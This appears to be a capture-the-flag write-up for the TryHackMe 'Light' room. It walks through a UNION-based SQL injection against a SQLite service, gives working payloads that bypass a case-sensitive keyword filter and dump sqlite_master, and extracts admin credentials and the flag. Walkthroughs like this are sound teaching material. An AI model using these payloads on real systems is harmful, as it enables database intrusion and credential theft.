This file describes all steps of execution for THM room (Light)
It's a room where we exploited an SQL injection in a SQLite database to retrieve the credentials for the admin user and a flag.
Difficulty - Easy

MACHINE-IP: 10.112.142.122
PORT: 1337
username: smokey
password: vYQ5ngPpw8AdUmL

Difficulty - Easy

MACHINE-IP: 10.112.142.122
PORT: 1337

username: smokey

password: vYQ5ngPpw8AdUmL

I connected to the service using netcat:

rlwrap nc 10.10.67.194 1337

The application displayed:

Welcome to the Light database!
Please enter your username:

The room instructions suggested using the username smokey. I entered it and received the password for the user:

Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Discovering the SQL Injection

Since the application is a database application, I started testing for SQL injection.

I first entered a single quote:

'

The application returned an SQL error:

Error: unrecognized token: "''' LIMIT 30"

This confirmed that the input was being inserted directly into an SQL query.

I then tried a UNION-based SQL injection and attempted to comment out the rest of the query:

' UNION SELECT 1-- -

However, the application returned:

For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)

This showed that some characters and SQL comment sequences were being filtered.

Instead of commenting out the remaining part of the query, I tried to make the resulting SQL query valid by adding another quote at the end of the payload.

I used:

' UNION SELECT 1 '

The application then returned:

Ahh there is a word in there I don't like :(

This suggested that certain SQL keywords were being filtered.

I tested the keywords individually:

UNION

Output:

Ahh there is a word in there I don't like :(

Then:

SELECT

Output:

Ahh there is a word in there I don't like :(

The filter appeared to be case-sensitive, so I tried different capitalization:

Union

Output:

Username not found.

Then:

Select

Output:

Username not found.

This showed that the filter could be bypassed by changing the capitalization of the SQL keywords.

I combined this with the previous payload:

' Union Select 1 '

The injection worked successfully:

Please enter your username: ' Union Select 1 '
Password: 1

At this point, I had a working UNION-based SQL injection.

Identifying the DBMS

The next step was to identify which database management system was being used.

I first tried the version() function:

' Union Select version() '

The application returned:

Error: no such function: version

I then tried:

' Union Select USER_ID(1) '

The application returned:

Error: no such function: USER_ID

Since the application was likely using SQLite, I tried the SQLite-specific version function:

' Union Select sqlite_version() '

This worked:

Password: 3.31.1

The database management system was therefore SQLite.

Dumping Database Structure

Now that I knew the database was SQLite, I could query the SQLite system table.

SQLite stores database schema information in sqlite_master.

I used the following payload:

' Union Select group_concat(sql) FROM sqlite_master '

The application returned:

Password: CREATE TABLE usertable (
id INTEGER PRIMARY KEY,
username TEXT,
password INTEGER),CREATE TABLE admintable (
id INTEGER PRIMARY KEY,
username TEXT,
password INTEGER)

The database contained two tables: usertable and admintable.

Both tables contained:

id
username
password

Since the goal was to retrieve the administrator credentials, I focused on the admintable.

Extracting Data

I used group_concat() to combine the username and password fields into a single result.

The payload I used was:

' Union Select group_concat(username || ":" || password) FROM admintable '

The application returned the administrator credentials and the flag:

Password: Tr[REDACTED]in:ma[REDACTED]17,flag:THM{SQ[REDACTED]O?}

This revealed the admin username, admin password, and the room flag.

Room Completed

The room was completed by exploiting the SQLite SQL injection to:

Confirm that SQL injection was possible.
Bypass the keyword filter using capitalization.
Identify SQLite as the DBMS.
Extract the database structure from sqlite_master.
Identify the admintable.
Extract the administrator credentials.
Retrieve the final flag.
